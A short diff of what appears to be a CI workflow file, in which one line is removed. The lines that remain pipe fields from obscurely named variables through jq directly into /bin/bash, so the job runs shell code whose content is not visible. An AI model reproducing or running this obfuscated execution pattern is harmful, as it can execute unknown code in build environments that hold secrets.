@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$uanvd84702" | jq -r .rv06 | /bin/bash
           echo $gobj90 | jq -r .u193 | /bin/bash
           echo $ec36 | jq -r .fcj691 | /bin/bash
-          echo $zx74 | jq -r .rmrk52 | /bin/bash
 
       - name: Upload results
         if: always()
